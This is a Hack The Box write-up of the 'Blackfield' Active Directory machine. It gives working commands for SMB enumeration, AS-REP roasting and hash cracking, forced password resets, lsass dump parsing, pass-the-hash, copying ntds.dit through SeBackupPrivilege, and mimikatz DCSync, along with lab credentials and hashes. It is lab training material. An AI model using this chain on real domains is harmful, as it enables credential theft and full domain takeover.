---
layout: post
title: Blackfield
description: Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations.
categories: [writeups]
tags: [HTB, Active Directory, AS-REP Roasting]
image:
  path: /assets/blackfield/Blackfield.png
assets_path: /assets/blackfield
---

## **Summary**

We found a list of users in a SMB share, then exploited a misconfiguration to get a hash (we could crack offline) and access one of the user accounts.
After that we changed another user's password to access a `fonrensic` SMB share from which we retrieved credentials for a third user.
The latter was used to dump the active directory database and retrieve the Administrator's NTML hash.

## **Enum**

### **nmap**

Started off with a port scan which revealed a set of open ports indicating the presence of active directory.

```sh
sudo nmap 10.10.10.192 -sS -p- -T4 -oN nmap/ss-full.nmap
nmap 10.10.10.192 -sVC -p $(cat nmap/ss-full.nmap | grep open | cut -d '/' -f 1 | tr '\n' ',') -oN nmap/scv-full.nmap -Pn
```

![]({{page.assets_path}}/000.png)

### **smb**

SMB had anonymous access enabled which means we could enumerate shares without providing credentials.

```sh
crackmapexec smb blackfield.local -u '_' -p '' --shares
```

![]({{page.assets_path}}/001.png)

One of the none usual shares we had access to is `profiles$`, it conatined a list of directories named as usernames.
We saved these usernames into a file `users.txt`.

```sh
smbclient -N '//blackfield.local/profiles$'
```

![]({{page.assets_path}}/002.png)

### **kerberos**

Feeding the list of users to `kerbrute` gave us three valid ones `audit2020`, `support` and `svc_backup`.

> `kerbrute` is a tool to quickly bruteforce and enumerate valid Active Directory accounts through `Kerberos Pre-Authentication` 
which is a security feature in the Kerberos authentication protocol that requires a user to provide their password or a secret key before receiving a ticket for accessing services.
{: .prompt-tip}

```sh
kerbrute userenum --dc dc1.blackfield.local -d blackfield.local users.txt
```

![]({{page.assets_path}}/003.png)

The user `support` had kerberos pre-authentication disabled which allowed us to perform an `AS-REP Raosting` attack to get a hash we could crack offline.

```sh
GetNPUsers.py blackfield.local/support
```

![]({{page.assets_path}}/004.png)

After cracking the retrieved hash, we found the password for the user `support`: `#00^BlackKnight`

```sh
hashcat -a 0 -m 18200 support.asrep /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![]({{page.assets_path}}/005.png)

### **bloodhound**

We used bloodhound to enumerate the domain further.

First we used [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) to gather the information from the domain.
This command generates a `zip` file that can be imported to `bloodhound` for analysis.

```sh
bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -c All --zip -ns 10.10.10.192
```

> To setup Bloodhound refer to the documentation [Here](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
{: .prompt-info}

From the results we found that the user `support` can change the user `audit2020`'s password.

![]({{page.assets_path}}/008.png)

### **rpc**

We changed the password of the user `audit2020` to `Password@123`.

```sh
rpcclient -U blackfiled.local/support%'#00^BlackKnight' 10.10.10.192
rpcclient $> setuserinfo2 audit2020 23 'Password@123'
```

> `setuserinfo2 [username] [level] [password] [password_expired]`
>
> All the parameters are self explanatory except for the `level` which represents the `USER_INFORMATION_CLASS` we wish to update.
> `23` is the level that will allow us to change the user's password
>
> To learn more about the `USER_INFORMATION_CLASS` refer to [Microsoft Docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
> 
{: .prompt-info}

![]({{page.assets_path}}/009.png)

As `audit2020` we had access to a new share `forensic`.

```sh
crackmapexec smb blackfield.local -u 'audit2020' -p 'Password@123' --shares
```

![]({{page.assets_path}}/010.png)

After accessing the `forensic` share using `smbclient.py`.

```sh
smbclient.py blackfield.local/audit2020:'Password@123'@10.10.10.192
```

We exfiltrated a file named `lsass.zip`.

```
# use forensic
# cd memory_analysis
# get lsass.zip
```

![]({{page.assets_path}}/011.png)

After unzipping it, we got a file `lsass.DMP`, a memory dump of the `lsass.exe` process

```sh
unzip lsass.zip
```

![]({{page.assets_path}}/012.png)

> LSASS, or Local Security Authority Subsystem Service, is a crucial process in Microsoft Windows that enforces security policies, verifies user logins, handles password changes, and creates access tokens. It is essential for the normal operation of Windows systems and writes to the Windows Security Log.
{: .prompt-info}

We got the NT hash for `svc_backup` user from `lsass.DMP`

```sh
pypykatz lsa minidump lsass.DMP -p msv
```

![]({{page.assets_path}}/013.png)

## **Foothold**

Having the NT hash, we accessed the machine as `svc_backup` using `evil-winrm`

```sh
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![]({{page.assets_path}}/014.png)

## **PrivEsc**

`svc_backup` is a member of `BACKUP OPERATORS`, he has `SeBackupPrivilege` and `SeRestorePrivilege` privileges

![]({{page.assets_path}}/015.png)

These privileges allow the user to create backups, what we could do here is make a copy of `ntds.dit` and `system` registry hive and use them to extract
users' NTLM hashes.

> What is NTDS.DIT?  
>NTDS.DIT stands for New Technology Directory Services Directory Information Tree. It serves as the primary database file within Microsoft’s Active Directory Domain Services (AD DS). Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. It acts as the backbone of Active Directory, housing critical data such as user account details, passwords, group memberships, and other object attributes.
{: .prompt-info}

Because `ntds.dit` is in use by the domain, we could't just copy it. That's why we created the following script to make a shadow copy of the `C:/` drive.

{: file="shadow.dsh"}
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

> Make sure the lines and with `CRLF`
{: .prompt-warning}

> To better understand this script and learn other methods on abusing `SeBackupPrivilege`, refer to this [Blog Post](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58)
{: .prompt-tip}

From `evil-winrm` shell, we created the shadow copy of the `C:/` drive using `diskshadow`, then we created a copy of `ntds.dit` using `robocopy`
and also copied the `system` registry hive.

Lastly, we exfiltrated both files.

```powershell
upload shadow.dsh
diskshadow.exe /s shadow.dsh
robocopy /B F:\Windows\NTDS . ntds.dit
reg save hklm\system system
download ntds.dit
download system
```

Now that we have `ntds.dit` and `system` hive, we can retrieve users' NTLM hashes.

```sh
secretsdump.py -ntds ntds.dit -system system LOCAL -just-dc-ntlm | tee ntds.ntlm
```

![]({{page.assets_path}}/016.png)

Finally, we accessed the machine as `Administrator` and got the root flag.

```sh
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

![]({{page.assets_path}}/017.png)

## **Clean up**

After finishing, it is always a good practice to revert every change you made in the environment.

Deleted the shadow copy using the following script.

{: file="shadow_delete.dsh"}
```
delete shadows all
```

From `evil-winrm`

```powershell
upload shadow_delete.dsh
diskshadow.exe /s shadow_delete.dsh
```

Changed back the password of the user `audit2020`.

Got the NTLM hash of the old password using mimikatz.

```powershell
./mimikatz.exe "lsadump::dcsync /user:audit2020" "exit"
```
![]({{page.assets_path}}/018.png)

Then set the ntlm (`ntlm- 1`) to the user `audit2020`.

```powershell
./mimikatz.exe "lsadump::setntlm /server:dc01.blackfield.local /user:audit2020 /ntlm:600a406c2c1f2062eb9bb227bad654aa" "exit"
```
![]({{page.assets_path}}/019.png)
